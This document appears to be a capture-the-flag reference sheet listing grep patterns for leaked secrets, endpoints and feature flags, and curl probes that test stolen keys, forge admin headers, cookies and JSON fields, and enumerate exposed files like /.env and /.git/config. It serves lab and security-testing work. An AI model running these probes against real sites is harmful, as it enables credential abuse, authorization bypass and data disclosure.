# Payload patterns — the grep patterns and probe payloads

## The grep payload set — endpoint shapes

```bash
# absolute paths
"/api/[^"]*"  "/v[0-9]+/[^"]*"  "/internal/[^"]*"  "/admin[^"]*"
"/graphql"  "/auth/[^"]*"  "/user/[^"]*"  "/file/[^"]*"
"/upload"  "/export"  "/debug"  "/manage"  "/actuator[^"]*"
# call sites
fetch\(["'`][^"'`]+  axios\.[a-z]+\(["'`][^"'`]+  \.get\(["'`][^"'`]+
\.post\(["'`][^"'`]+  \.put\(["'`][^"'`]+  \.delete\(["'`][^"'`]+
```

## The grep payload set — secret shapes

```bash
eyJ[\w-]+\.[\w-]+\.[\w-]+                       # JWT
(AKIA|ASIA)[0-9A-Z]{16}                          # AWS key id
AIza[0-9A-Za-z_-]{35}                            # GCP
(ghp|gho|ghs|github_pat_|glpat-)[0-9A-Za-z_-]{20,}  # GitHub/GitLab
xox[baprs]-[0-9A-Za-z-]{10,}                     # Slack
(sk|pk|rk)_(live|test)_[0-9A-Za-z]+              # Stripe
-----BEGIN [A-Z ]+PRIVATE KEY-----               # private key
(api[_-]?key|secret|token|password|client_secret|auth)["'\s:=]+["'][\w./+@=-]{6,}
(postgres|mysql|mongodb|redis|amqp)://[^"']+     # connection string
```

## The grep payload set — flag/config/param shapes

```bash
(feature|flags|config|settings|debug)\.[a-zA-Z_.]+     # a gate
(is[Aa]dmin|is_admin|role|permission|level|beta|internal)\s*[:=]
(REACT_APP|NEXT_PUBLIC|VUE_APP|VITE|GATSBY|NUXT)_[A-Z_]+
process\.env\.[A-Z_a-z]+  import\.meta\.env\.[A-Z_]+
window\.__[A-Z_]+__\s*=  "runtimeConfig":\{[^}]+
[?&][a-zA-Z_$]+=           # a query param
[{,]\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*:    # an object key
\$\{[a-zA-Z_$][a-zA-Z0-9_$.]*\}        # a template-literal param
flag\{[^}]*\}  ctf\{[^}]*\}            # the flag shape
```

## The probe payload set — endpoint verify

```bash
curl -s -o t -w '%{http_code} %{content_type}\n' "$BASE$ep"      # real?
curl -s "$BASE$ep" | head -c 200                                # index or data?
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api$(echo $ep | sed 's|^/||')"
```

## The probe payload set — secret verify

```bash
curl -s -H "Authorization: Bearer $K" "$BASE/api/me"
curl -s -H "X-API-Key: $K" "$BASE/api/me"
curl -s -H "X-Auth-Token: $K" "$BASE/api/me"
curl -s "$BASE/api/me?api_key=$K&token=$K"
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

## The probe payload set — flag/gate verify

```bash
# client-gate probes — is the gated endpoint public?
curl -s "$BASE$gated_ep"
curl -s "$BASE$gated_ep?debug=1&admin=1&internal=1"
curl -s -H "X-Debug: 1" -H "X-Admin: 1" -H "X-Internal: 1" "$BASE$gated_ep"
curl -s -H "Cookie: admin=1; role=admin; isAdmin=true" "$BASE$gated_ep"
curl -s -X POST -H "Content-Type: application/json" -d '{"role":"admin","is_admin":true,"debug":true}' "$BASE$gated_ep"
```

## The probe payload set — adjacent disclosure

```bash
for p in /.git/HEAD /.env /.git/config /backup.zip /app.zip /src/ /config.js /env.js /static/maps/ /package.json /composer.json /robots.txt /sitemap.xml /.DS_Store /web.config /README.md /CHANGELOG.md /api/config /api/swagger.json /openapi.json /swagger-ui.html /actuator /actuator/env /metrics; do
  printf '%-24s ' "$p"; curl -s -o /dev/null -w '%{http_code} %{ct}\n' "$BASE$p"
done
```

## The flag-shape probe

```bash
python3 tools/hooks.py pre-flag <chal> --value '<candidate>' \
  --source '<the source or response>' --evidence '<the verbatim excerpt>'
```
